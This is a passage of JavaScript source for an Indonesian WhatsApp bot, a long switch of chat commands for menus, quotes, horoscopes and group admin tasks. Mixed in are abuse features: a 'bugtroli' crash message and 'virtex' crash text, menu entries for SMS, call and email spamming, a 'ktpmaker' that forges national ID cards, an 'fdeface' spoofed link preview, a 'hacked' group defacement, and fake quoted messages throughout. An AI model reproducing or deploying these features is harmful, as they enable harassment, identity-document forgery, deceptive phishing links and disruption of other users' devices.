│─────────────────────
│❏ \`\`\`${prefix}limit\`\`\`
│❏ \`\`\`${prefix}atm\`\`\`
│❏ \`\`\`${prefix}buylimit [ jumlah ]\`\`\`
╰────────────────────`
					zaki.sendMessage(from, limitme, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//Ownermenu
	case 'ownermenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const ownerme = `╭─────────────────────
│    「 OWNER MENU 」
│─────────────────────
│❏ \`\`\`${prefix}setprefix\`\`\`
│❏ \`\`\`${prefix}setppbot\`\`\`
│❏ \`\`\`${prefix}block [ @tag ]\`\`\`
│❏ \`\`\`${prefix}unblock [ @tag ]\`\`\`
│❏ \`\`\`${prefix}bc [ text ]\`\`\`
│❏ \`\`\`${prefix}bcgc [ text ]\`\`\`
│❏ \`\`\`${prefix}clone [ @tag ]\`\`\`
│❏ \`\`\`${prefix}clearall\`\`\` 
│❏ \`\`\`${prefix}setthum\`\`\`
│❏ \`\`\`${prefix}addbadword [ text ]\`\`\`
│❏ \`\`\`${prefix}delbadword\`\`\`
│❏ \`\`\`${prefix}exe\`\`\`
│❏ \`\`\`${prefix}upswtext\`\`\`
│❏ \`\`\`${prefix}upswimg\`\`\`
│❏ \`\`\`${prefix}upswvid\`\`\`
│❏ \`\`\`${prefix}return\`\`\`
│❏ \`\`\`${prefix}inspect\`\`\`
│❏ \`\`\`${prefix}get\`\`\`
│❏ \`\`\`${prefix}run\`\`\`
╰────────────────────`
					zaki.sendMessage(from, ownerme, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//MENUGET
	case 'stroagemenu':
					if (!isRegister) return reply(mess.only.daftarB)

			const getme =`╭─────────────────────
│    「 GET MENU 」
│─────────────────────
│❏ \`\`\`${prefix}addimg [ nama packnama ]\`\`\`
│❏ \`\`\`${prefix}addvn [ nama package ]\`\`\`
│❏ \`\`\`${prefix}addvideo [ nama package ]\`\`\`
│❏ \`\`\`${prefix}listimg\`\`\`
│❏ \`\`\`${prefix}listvn\`\`\`
│❏ \`\`\`${prefix}listvideo\`\`\`
│❏ \`\`\`${prefix}getimg [ nama package ]\`\`\`
│❏ \`\`\`${prefix}getvn [ nama package ]\`\`\`
│❏ \`\`\`${prefix}getvideo [ nama package ]\`\`\`
╰────────────────────`
					zaki.sendMessage(from, getme, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  

//Othermenu
	case 'othermenu':

					if (!isRegister) return reply(mess.only.daftarB)

					const otherme = `╭─────────────────────
│     「 OTHER MENU 」
│─────────────────────
│❏ \`\`\`${prefix}ip [  ip  ]\`\`\`
│❏ \`\`\`${prefix}infonomer\`\`\`
│❏ \`\`\`${prefix}send\`\`\`
│❏ \`\`\`${prefix}wame\`\`\`
│❏ \`\`\`${prefix}virtex\`\`\`
│❏ \`\`\`${prefix}qrcode [ text ]\`\`\`
│❏ \`\`\`${prefix}timer\`\`\`
│❏ \`\`\`${prefix}fml\`\`\`
│❏ \`\`\`${prefix}fml2\`\`\`
│❏ \`\`\`${prefix}jadwaltv\`\`\`
│❏ \`\`\`${prefix}tvjadwal\`\`\`
│❏ \`\`\`${prefix}spamsms 08xxxxxxxx\`\`\`
│❏ \`\`\`${prefix}spamcall 08xxxxxxxx\`\`\`
│❏ \`\`\`${prefix}spamgmail xxxx@gmail.com\`\`\`
│❏ \`\`\`x\`\`\`
╰────────────────────`
					zaki.sendMessage(from, otherme, text, { thumbnail: zakinew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./temp/image/HLXB.jpeg'), surface: 200, message: '𝙷𝙻𝚇 𝙱𝙾𝚃', orderTitle: '𝙷𝙻𝚇 𝙱𝙾𝚃', sellerJid: '0@s.whatsapp.net'}}}})
					break                                                  
                                
                  case 'timer':
				if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam")}
				setTimeout( () => {
				reply("Waktu habis")
				}, timer)
				break                                                  
//--Info bot
				case 'info':
  me = zaki.user
  uptime = process.uptime()
  const onbot = kyun(uptime)
  teks = `
➪ *Name bot* : ${botName}
➪ *Nomor bot* : @${me.jid.split('@')[0]}
➪ *Owner* : ${ownerName}
➪ *Prefix* : ${prefix}
➪ *Total Block* : ${blocked.length}
➪ *Total Chat* : ${totalchat.length}
➪ *Total Pengguna Terdaftarz* : ${_registered.length}
➪ *Aktif* : ${onbot}
`
  buffer = fs.readFileSync('./temp/image/HLXB.jpeg')
  zaki.sendMessage(from, buffer, image, {quoted: mek, 
caption: teks,
  mentionedJid: [me.jid]})
  break                                                  
                case 'bahasa':
		reply(from, bahasa(prefix, sender), text, {quoted: mek})
                break                                                  
               case 'virtex':
                 if (!isOwner) return reply(mess.only.virtex)
               zaki.sendMessage(from, virtex(prefix, sender), text, {quoted: mek})
               break                                                  
               case 'kodenegara':
               zaki.sendMessage(from, negara(prefix, sender), text, {quoted: mek})
               break                                                  
				case 'demote':
					if (!isGroup) return fakeimage(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Yah Kasian Di Demote')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = `Berhasil Demote :\n`
						for (let _ of mentioned) {
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						zaki.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`Berhasil Demote @${mentioned[0].split('@')[0]} Menjadi Member Group!`)
						zaki.groupDemoteAdmin(from, mentioned)
					}
					break                                                  
                                
                                
                  case 'promote':
					zaki.updatePresence(from, Presence.composing) 
                                        if (!isRegister) return reply(mess.only.daftarB)
					if (!isGroup) return fakeimage(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di promote!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Perintah di terima, menambah jabatan sebagai admin :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						zaki.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`Perintah di terima, menambah jabatan sebagai admin : @${mentioned[0].split('@')[0]}`, mentioned, true)
						zaki.groupMakeAdmin(from, mentioned)
					}
					break                                                  
				  case 'wa.me':
				  case 'wame':
                                          zaki.updatePresence(from, Presence.composing)
                                          try {
                                                  ppimg = await zaki.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
                                          } catch {
                                                  ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				          }
                                          teks = `「 *SELF WHATSAPP* 」\n\n_Request by_ : *@${sender.split("@s.whatsapp.net")[0]}\n\nYour link WhatsApp : *wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*Or ( / )*\n*api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
                                          console.log('Getting WhatsApp Profile Image...')
                                          zaki.sendMessage(from, ppimg, image, { quoted: mek, caption: teks, contextInfo: { "mentionedJid": [sender] } } )
				          break                                                  
//***********Random Kata**********//
			case 'quotes':
				zaki.updatePresence(from, Presence.composing) 
                                if (!isRegister) return reply(mess.only.daftarB)
                                if (isLimit(sender)) return reply(ind.limitend(pushname))
				data = await fetchJson(`http://zekais-api.herokuapp.com/quotes`)
				ez = `*❑ Author :* ${data.author}\n*❑ Quotes :* ${data.quotes}`
				reply(ez)
                                await limitAdd(sender)
				break                                                  

				case 'nickepep':

				zaki.updatePresence(from, Presence.composing) 

                                if (!isRegister) return reply(mess.only.daftarB)
                                if (isLimit(sender)) return reply(ind.limitend(pushname))
				data = await fetchJson(`https://api.zeks.xyz/api/nickepep?apikey=${apizeks}`)
				ez = `${data.result}`
				reply(ez)
                                await limitAdd(sender)
				break                                                  
case 'suit':

				zaki.updatePresence(from, Presence.composing) 


                                if (!isRegister) return reply(mess.only.daftarB)
                                if (isLimit(sender)) return reply(ind.limitend(pushname))
			   teks = body.slice(8)
				data = await fetchJson(`https://api.xteam.xyz/game/suit?q=${teks}APIKEYY=dd483007f0dca8d7`)
				ez = ` *Jawabanmu* : ${data.jawabanmu}\n*Jawabnbot* : ${data.jawabanbot}\n*Hasil* : ${data.hasil}\n*Poin* : ${data.poin}`
				
				zaki.sendMessage(from, ez, text, {quoted: mek})
        await limitAdd(sender)
				break                                                  
case 'ktpmaker':
  if (!isRegister) return reply(mess.only.daftarB) 
  
 if (isLimit(sender)) return reply(ind.limitend(pushname))
				reply(ind.wait)
                    if (args.length == 0) return reply(`Usage: ${prefix + command} nik|provinsi|kabupaten|nama|tempat, tanggal lahir|jenis kelamin|jalan|rt/rw|kelurahan|kecamatan|agama|status nikah|pekerjaan|warga negara|berlaku sampai|url_image\n\nExample: ${prefix + command} 456127893132123|bumipertiwi|fatamorgana|LoL Human|mars, 99-99-9999|belum ditemukan|jl wardoyo|999/999|turese|imtuni|alhamdulillah islam|jomblo kack|mikirin dia|indo ori no kw|hari kiamat|https://i.ibb.co/Xb2pZ88/test.jpg`)
                    get_args = args.join(" ").split("|")
                    nik = get_args[0]
                    prov = get_args[1]
                    kabu = get_args[2]
                    name = get_args[3]
                    ttl = get_args[4]
                    jk = get_args[5]
                    jl = get_args[6]
                    rtrw = get_args[7]
                    lurah = get_args[8]
                    camat = get_args[9]
                    agama = get_args[10]
                    nikah = get_args[11]
                    kerja = get_args[12]
                    warga = get_args[13]
                    until = get_args[14]
                    img = get_args[15]
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/ktpmaker?apikey=${lolKey}&nik=${nik}&prov=${prov}&kabu=${kabu}&name=${name}&ttl=${ttl}&jk=${jk}&jl=${jl}&rtrw=${rtrw}&lurah=${lurah}&camat=${camat}&agama=${agama}&nikah=${nikah}&kerja=${kerja}&warga=${warga}&until=${until}&img=${img}`)
                    zaki.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break                                                  
case 'ceritahoror':

                  if (!isRegister) return reply(mess.only.daftarB)           
                  if (isLimit(sender)) return reply(ind.limitend(pushname))

				
				
				reply(ind.wait)
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/ceritahoror?apikey=${lolKey}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Desc : ${get_result.desc}\n`
                    ini_txt += `Story :\n${get_result.story}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    zaki.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    break                                                  
  case 'cerpen':  
                   if (!isRegister) return reply(mess.only.daftarB)	
                   anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/cerpen`)                   
                   anu1 = `➻ *JUDUL* : ${anu.result.title}\n`
                   anu1 += `➻ *PENGARANG* : ${anu.result.pengarang}\n` 
                   anu1 += `➻ *KATEGORI* : ${anu.result.kategori}\n`
                   anu1 += `➻ *CERPEN* : ${anu.result.cerpen}\n`
                   reply(anu1)
                   break                                                  
case 'jadwalanoboy':
				zaki.updatePresence(from, Presence.composing) 
                                if (!isRegister) return reply(mess.only.daftarB)
                                if (isLimit(sender)) return reply(ind.limitend(pushname))
				data = await fetchJson(`https://leyscoders-api.herokuapp.com/api/jadwalanoboy?apikey=OneDayOneCharity`)
				ez = `${data.result}`
				reply(ez)
                                await limitAdd(sender)
				break                                                  
case 'pantun':

				zaki.updatePresence(from, Presence.composing) 

                                if (!isRegister) return reply(mess.only.daftarB)
                                if (isLimit(sender)) return reply(ind.limitend(pushname))
				data = await fetchJson(`https://pencarikode.xyz/api/pantun?apikey=pais`)
				ez = `${data.pantun}`
				reply(ez)
                                await limitAdd(sender)
				break                                                  
case 'motivasi':

				zaki.updatePresence(from, Presence.composing) 

                                if (!isRegister) return reply(mess.only.daftarB)
                                if (isLimit(sender)) return reply(ind.limitend(pushname))
				data = await fetchJson(`https://pencarikode.xyz/api/motivasi?apikey=pais`)
				ez = `${data.message}`
				reply(ez)
                                await limitAdd(sender)
				break                                                  
//************Random Images*************//
case 'randomhentai':
                                        if (!isRegister) return reply(mess.only.daftarB)

                     if (!isPrem) return reply(mess.only.premium)

                              if (isLimit(sender)) return reply(ind.limitend(pushname))
                                        reply(mess.wait)
                                        anu = await fetchJson(`https://tobz-api.herokuapp.com/api/hentai?apikey=${apitobz}`, {method: 'get'})
                                        buffer = await getBuffer(anu.result)
                                        zaki.sendMessage(from, buffer, image, {quoted: mek})
                                        await limitAdd(sender)
                                        break                                                  
//*************End Random Images********//
              case 'owner':
                case 'creator':
                  case 'Dev':
                    case 'Developer':
                      case 'developerbot':
                        case 'pemilikbot':
                          foto_zaki = fs.readFileSync(`./temp/image/inizaki.jpeg`) 
                  zaki.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: mek})
                  info_zaki = `Yoo, Halo Tod~\nKenalin Gw *Ahmad Zaki* Pemilik _*HLX BOT*_. Umur Gw Masih 15 Th dan Kelas 1 SMK. Ada Yang Bisa Saya Bantu?, Silahkan Hubungi Nomor Saya Jika Ada Keperluan Mengenai _*HLX BOT*_ Atau Keperluan Lainnya. \n\nArigathank~`
              zaki.sendMessage(from, foto_zaki, image, { quoted: mek, caption: info_zaki})
                break                                                 
             case 'bugtroli':
               if (!isPrem) return reply(mess.only.premium)
                    thumb = "https://i.ibb.co/4ZFDCWZ/316c33b0bc2c.jpg"
                    xxx = await getBuffer(thumb)
                    url = "https://i.ibb.co/4ZFDCWZ/316c33b0bc2c.jpg"
                    thumbcr = await getBuffer(url)
                    zaki.sendMessage(from, xxx, image, {thumbnail: xxx, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 
                    orderMessage: {
                    itemCount: 999999,
                    orderTitle: 'Bugtroli',
                    sellerJid: '0@s.whatsapp.net',
                    jpegThumbnail: thumbcr
                    }
                    }
                    }, contextInfo: { forwardingScore: 508, isForwarded: true}})
                    break                                                  
case 'bugtarget':
                    var groupahha = await zaki.groupMetadata(from)
                    var member = groupahha['participants']
                    var mem = []
                    member.map( async adm => {
                    mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                    })
                    teks = 'HLX BOT'
                    zaki.sendMessage(from, teks, text, {contextInfo: {
                    mentionedJid: mem}, quoted: mek
                    })
                    if (args[0] === 'true') {
                    zaki.toggleDisappearingMessages(args[1], 0)
                    } else if (args[0] === 'false') {
                    zaki.toggleDisappearingMessages(args[1], 604800)
                    }
                    break                                                  

	case 'self':

           if (!isOwner) return reply(ind.ownerB())

           if (self === true) return 
            let denzz = {
            thumbnail: zakinew, sendEphemeral: true,
            quoted: { 
           key: { 
           fromMe: false, participant: `0@s.whatsapp.net`, 
           remoteJid: "6283136505591-1614953337@g.us", id: "B391837A58338BA8186C47E51FFDFD4A" }, 
           message: { documentMessage: { 'jpegThumbnail': fs.readFileSync("./temp/image/thumbnail.jpeg"), mimetype: "application/octet-stream",
           title: "Status : Self", fileLength: "36", pageCount: 0, 
           fileName: "Status : Self",
           messageTimestamp: "1614069378", status: "PENDING"
           }
           }
           }
           }
           self = true 
           let lat =`\`\`\`Sukses Mengaktifkan Mode Self\`\`\``
           zaki.sendMessage(from, lat, MessageType.text, denzz)
           break                                                    
           case 'public':
           if (!isOwner) return reply(ind.ownerB())
           if (self === false) return 
           let denss = {
           thumbnail: zakinew, sendEphemeral: true,
           quoted: { 
           key: { 
           fromMe: false, participant: `0@s.whatsapp.net`, 
           remoteJid: "6283136505591-1614953337@g.us", id: "B391837A58338BA8186C47E51FFDFD4A" }, 
           message: { documentMessage: { 'jpegThumbnail': fs.readFileSync("./temp/image/thumbnail.jpeg"), mimetype: "application/octet-stream",
           title: "Status : Public", fileLength: "36", pageCount: 0, 
           fileName: "Status : Public",
           messageTimestamp: "1614069378", status: "PENDING"
           }
           }
           }
           }
           self = false
           let breh =`\`\`\`Sukses Mengaktifkan Mode Public\`\`\``
           zaki.sendMessage(from, breh, MessageType.text, denss)
           break                                                  
					break                                                  
case 'ephemeral':    
					if (!isRegister) return reply(mess.only.daftarB)
					if (!isGroup) return reply(mess.only.group())
					if (!isGroupAdmins) return reply(mess.only.admin())
                ppgc = await zaki.getProfilePicture(from)
                teks = args.join(' ')
                sksks = body.slice(11)
                group = await zaki.groupMetadata(from);
                member = group['participants']
                jids = [];
                member.map( async adm => {
                jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
                 })
                 options = {
                contextInfo: {mentionedJid: groupMembers.map(v => v.jid)},
               sendEphemeral: true, 
               thumbnail: await imageToBase64(ppgc)
                }
              await zaki.sendMessage(from, `${sksks}`, text, options, { contextInfo: { forwardingScore: 508, isForwarded: true}})
               break                                                  
case 'join':         
                      if (!isPrem) return reply(mess.only.premium)
                      
                     if (!isOwner) return reply(ind.ownerB())
                 
                    if (args.length < 1) return reply(`contoh ${prefix}join https://chat.whatsapp.com/CAPUjeauAafAskp3o5LDNj`)
		zaki.query({

json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply('Succes Bergabung Dalam Group')
break                                                   
   
					case 'hack':
         
				case 'fdeface':
        if (!isRegister) return reply(mess.only.daftarB)
           if (!isPrem) return reply(mess.only.premium)
				var nn = args.join(' ')
				var urlnye = nn.split("|")[0];
				var titlenye = nn.split("|")[1];
				var descnye = nn.split("|")[2];
				imgbbb = require('imgbb-uploader')
				run = getRandom('.jpeg')
				encmediae = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				media = await zaki.downloadAndSaveMediaMessage(encmediae)
				ddatae = await imageToBase64(JSON.stringify(media).replace(/\"/gi, ''))

				zaki.sendMessage(from, {

					text: `${urlnye}`,

					matchedText: `${urlnye}`,

					canonicalUrl: `${urlnye}`,

					description: `${descnye}`,

					title: `${titlenye}`,

					jpegThumbnail: ddatae
				}, 'extendedTextMessage', { detectLinks: false })
				break                                                  
                                break                                                  
               case 'hacked':
              
                if (!isRegister) return reply(mess.only.daftarB)
                if (!isGroup) return fakeimage(mess.only.group)
                if (!isPrem) return reply(mess.only.premium)
               reply(mess.wait)
                tessgc = await getBuffer(`https://i.ibb.co/m4Qx3JG/20210319-204838.jpg`)
                   zaki.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                zaki.groupUpdateSubject(from, `Hacked By ${body.slice(8)}`)
                await sleep(1000)
                zaki.groupUpdateDescription(from, `*_Hacked By ${pushname}_*`)             
                await sleep(1000)
                zaki.sendMessage(from, `Sukses Hack Grup ${groupMetadata.subject}`, text, {quoted: mek})
					break                                                    
case 'hidetag':

        if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        if (!isGroup) return reply(ind.groupo())
        if (!isGroupAdmins) return reply(ind.admin())
        var value = body.slice(9)
        var groupnandhs = await zaki.groupMetadata(from)
        var member = groupnandhs['participants']
        var mem = []
        member.map(async adm => {
          mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
        })
        var options = {
          text: value,
          contextInfo: {
            mentionedJid: mem
          },
          quoted: mek
        }
        zaki.sendMessage(from, options, text, {
          sendEphemeral: true,
          thumbnail: fs.readFileSync('./temp/image/zakinew.jpeg', 'base64')
        })
        await limitAdd(sender)
        break                                                  
          case 'tiktokstalk':
					try {
						if (args.length < 1) return zaki.sendMessage(from, 'Usernamenya mana kak? ', text, {quoted: mek})
                                                if (!isRegister) return reply(mess.only.daftarB)
                                                if (isLimit(sender)) return reply(ind.limitend(pushname))
						let { user, stats } = await tiktod.getUserProfileInfo(args[0])
						reply (mess.wait)
						teks = `*ID* : ${user.id}\n*Username* : ${user.uniqueId}\n*Nickname* : ${user.nickname}\n*Followers* : ${stats.followerCount}\n*Followings* : ${stats.followingCount}\n*Posts* : ${stats.videoCount}\n*Luv* : ${stats.heart}\n`
						buffer = await getBuffer(user.avatarLarger)
						zaki.sendMessage(from, buffer, image, {quoted: mek, caption: teks})
                                                await limitAdd(sender)
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('username tidak valid')
					}
					break                                                  
//PRIMBON MENU
				case 'artinama':
                  zaki.updatePresence(from, Presence.composing) 
                  if (!isRegister) return reply(mess.only.daftarB)
                  if (isLimit(sender)) return reply(ind.limitend(pushname))
                    data = await fetchJson(`https://api.zeks.xyz/api/artinama?apikey=${apizeks}&nama=${body.slice(10)}`)
                   reply(data.result)
                   await limitAdd(sender)
                   break                                                  
 case 'ramalnomer':  
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} 08123456789*`)
                    F = body.slice(12)
                    anu = await fetchJson(`https://api.xteam.xyz/primbon/nomorhoki?no=${F}&APIKEY=${apixteam}`)
                    anu1 = `➻ *RAMAL* : ${anu.result}`
                    reply(anu1)
                    break                                                  
                    case 'ramalcinta':  
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} 1&1&2001&nama&1&2&2003&nama2`)
                    var F = body.slice(12)
			        var F1 = F.split("&")[0];
			 	    var F2 = F.split("&")[1]; 
			 	    var F3 = F.split("&")[2]; 
			 	    var F4 = F.split("&")[3];
			 	    var F5 = F.split("&")[4]; 
			 	    var F6 = F.split("&")[5]; 
			 	    var F7 = F.split("&")[6];
			 	    var F8 = F.split("&")[7]; 			 	    
                    anu = await fetchJson(`https://api.xteam.xyz/primbon/ramalancinta?tgl1=${F1}&bln1=${F2}&thn1=${F3}&nama1=${F4}&tgl2=${F5}&bln2=${F6}&thn2=${F7}&nama2=${F8}&APIKEY=${apixteam}`)
                    anu1 = `➻ *JUDUL* : ${anu.result.judul}\n`
                    anu1 += `➻ *NAMA1* : ${anu.result.nama1}\n`
                    anu1 += `➻ *TANGGAL1* : ${anu.result.tgl1}\n`
                    anu1 += `➻ *NAMA2* : ${anu.result.nama2}\n`
                    anu1 += `➻ *TANGGAL2* : ${anu.result.positif}\n`
                    anu1 += `➻ *NEGATIF* : ${anu.result.negatif}\n`
                    anu1 += `➻ *POSITIF* : ${anu.result.info}\n`
                    anu2 = await getBuffer(anu.result.img)
                    zaki.sendMessage(from, anu2, image, {caption: anu1, quoted: mek})
                    break                                                  
                    case 'ramaljodoh':  
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} 1&1&2001&nama&1&2&2003&nama2`)
                    var F = body.slice(12)
			        var F1 = F.split("&")[0];
			 	    var F2 = F.split("&")[1]; 
			 	    var F3 = F.split("&")[2]; 
			 	    var F4 = F.split("&")[3];
			 	    var F5 = F.split("&")[4]; 
			 	    var F6 = F.split("&")[5]; 
			 	    var F7 = F.split("&")[6];
			 	    var F8 = F.split("&")[7]; 		
			 	    anu = await fetchJson(`https://api.xteam.xyz/primbon/ramalanjodoh?tgl1=${F1}&bln1=${F2}&thn1=${F3}&nama1=${F4}&tgl2=${F5}&bln2=${F6}&thn2=${F7}&nama2=${F8}&APIKEY=${apixteam}`)
			 	    anu1 = `➻ *JUDUL* : ${anu.result.judul}\n`
                    anu1 += `➻ *NAMA1* : ${anu.result.nama1}\n`
                    anu1 += `➻ *TANGGAL1* : ${anu.result.tgl1}\n`
                    anu1 += `➻ *NAMA2* : ${anu.result.nama2}\n`                     
                    anu1 += `➻ *KALKULASI* : ${anu.result.kalkulasi}\n`
                    anu1 += `➻ *POSITIF* : ${anu.result.info}\n`
			 	    reply(anu1)
			 	    break                                                  
			 	    case 'jodohbali':  
                    if (!isRegister) return reply(mess.only.daftarB)
			 	    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} 1&1&2001&nama&1&2&2003&nama2`)
                    var F = body.slice(11)
			        var F1 = F.split("&")[0];
			 	    var F2 = F.split("&")[1]; 
			 	    var F3 = F.split("&")[2]; 
			 	    var F4 = F.split("&")[3];
			 	    var F5 = F.split("&")[4]; 
			 	    var F6 = F.split("&")[5]; 
			 	    var F7 = F.split("&")[6];
			 	    var F8 = F.split("&")[7]; 		
			 	    anu = await fetchJson(`https://api.xteam.xyz/primbon/ramalanjodohbali?tgl1=${F1}&bln1=${F2}&thn1=${F3}&nama1=${F4}&tgl2=${F5}&bln2=${F6}&thn2=${F7}&nama2=${F8}&APIKEY=${apixteam}`)
			 	    anu1 = `➻ *JUDUL* : ${anu.result.judul}\n`
                    anu1 += `➻ *NAMA1* : ${anu.result.nama1}\n`
                    anu1 += `➻ *TANGGAL1* : ${anu.result.tgl1}\n`
                    anu1 += `➻ *NAMA2* : ${anu.result.nama2}\n`                     
                    anu1 += `➻ *KALKULASI* : ${anu.result.kalkulasi}\n`
                    anu1 += `➻ *POSITIF* : ${anu.result.info}\n`
			 	    reply(anu1)
			 	    break                                                  
			 	    case 'ramalnikah':  
                    if (!isRegister) return reply(mess.only.daftarB)
			 	    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} 1&1&2001&nama&1&2&2003&nama2`)
			 	    var F = body.slice(12)
			        var F1 = F.split("&")[0];
			 	    var F2 = F.split("&")[1]; 
			 	    var F3 = F.split("&")[2]; 
			 	    var F4 = F.split("&")[3];
			 	    var F5 = F.split("&")[4]; 
			 	    var F6 = F.split("&")[5]; 
			 	    var F7 = F.split("&")[6];
			 	    var F8 = F.split("&")[7]; 		
			 	    anu = await fetchJson(`https://api.xteam.xyz/primbon/ramalansuamiistri?tgl1=${F1}&bln1=${F2}&thn1=${F3}&nama1=${F4}&tgl2=${F5}&bln2=${F6}&thn2=${F7}&nama2=${F8}&APIKEY=${apixteam}`)
			 	    anu1 = `➻ *JUDUL* : ${anu.result.judul}\n`
			 	    anu1 += `➻ *SUAMI* : ${anu.result.suami}\n`
			 	    anu1 += `➻ *TANGGAL* : ${anu.result.tgl_suami}\n`
			 	    anu1 += `➻ *ISTRY* : ${anu.result.istri}\n`
			 	    anu1 += `➻ *TANGGAL* : ${anu.result.tgl_istri}\n`
			 	    anu1 += `➻ *TABEL* : ${anu.result.tabel}\n`
			 	    anu1 += `➻ *INFO* : ${anu.result.info}\n`
			 	    reply(anu1)
			 	    break                                                  
                    case 'taksirmimpi':  
                    if (!isRegister) return reply(mess.only.daftarB)
                    if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} di gigit ular`)
                    F = body.slice(9)
                    anu = await fetchJson(`https://api.xteam.xyz/primbon/tafsirmimpi?q=${F}&APIKEY=${apixteam}`)
                    anu1 = `➻ *HASIL* : ${anu.result}`
                    reply(anu1)
                    break                                                  
//film menu

                 case 'film': 	

                 if (!isRegister) return reply(mess.only.daftarB)
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				
					zaki.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/film?apikey=${apizeks}=${body.slice(6)}`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break                                                  
				case 'film2': 	
                 if (!isRegister) return reply(mess.only.daftarB)
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				
					zaki.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/film/2?apikey=${apizeks}=${body.slice(6)}`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break                                                  
					case 'searchfilm':
               
                pshh = `${body.slice(12)}`
                  anu = await fetchJson(`https://api.zeks.xyz/api/film/2?q=${pshh}&apikey=${apizeks}`, {method: 'get'})
                  puree = '======================\n'
                  for (let plyll of anu.result){
                  puree += ` *Judul:* ${plyll.title}\n *Link:* ${plyll.url}\n=====================\n`
                  }
                  reply(puree.trim())
